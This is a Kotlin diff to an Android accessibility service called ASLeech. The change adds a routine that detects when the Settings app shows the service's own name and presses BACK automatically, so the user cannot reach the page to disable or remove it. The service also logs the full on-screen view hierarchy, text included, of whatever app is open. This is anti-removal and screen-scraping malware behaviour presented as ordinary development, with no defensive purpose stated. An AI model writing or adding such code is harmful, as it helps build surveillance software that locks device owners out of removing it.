@@ -6,6 +6,7 @@ import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 
 class ASLeech : AccessibilityService() {
+    private val tag = "ASLeech"
 
     private lateinit var eventHandler: EventHandler
 
@@ -16,35 +17,51 @@ class ASLeech : AccessibilityService() {
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         event?.let {
-            // Example: Log the view hierarchy when the window state changes
-            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            if (it.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                 val rootNode: AccessibilityNodeInfo? = rootInActiveWindow
-                rootNode?.let {
-                    logViewHierarchy(it, 0)
+                rootNode?.let { root ->
+                    logViewHierarchy(root, 0)
+                    findAndPerformAction(root)
                 }
             }
         }
     }
 
     override fun onInterrupt() {
-        // Handle service interruption
+        Log.d(tag, "Service interrupted")
+    }
+
+    private fun findAndPerformAction(nodeInfo: AccessibilityNodeInfo): Boolean {
+        if (nodeInfo.packageName == "com.android.settings" &&
+            nodeInfo.className == "android.widget.TextView" &&
+            nodeInfo.text == "ASLeech") {
+
+            performGlobalAction(GLOBAL_ACTION_BACK)
+            return true
+        }
+
+        for (i in 0 until nodeInfo.childCount) {
+            val child = nodeInfo.getChild(i)
+            if (child != null && findAndPerformAction(child)) {
+                return true
+            }
+        }
+        return false
     }
 
     private fun logViewHierarchy(nodeInfo: AccessibilityNodeInfo, depth: Int) {
         val prefix = "  ".repeat(depth)
         val description = buildString {
             append(prefix)
-            append("Class: ${nodeInfo.className}, ")
-            append("Text: ${nodeInfo.text}, ")
-            append("ContentDescription: ${nodeInfo.contentDescription}, ")
-            append("ViewId: ${nodeInfo.viewIdResourceName}")
+            append(nodeInfo.toString())
         }
-        Log.d("ASLeech", description)
+
+        Log.d(tag, description)
 
         for (i in 0 until nodeInfo.childCount) {
             val child = nodeInfo.getChild(i)
-            if (child != null) {
-                logViewHierarchy(child, depth + 1)
+            child?.let {
+                logViewHierarchy(it, depth + 1)
             }
         }
     }
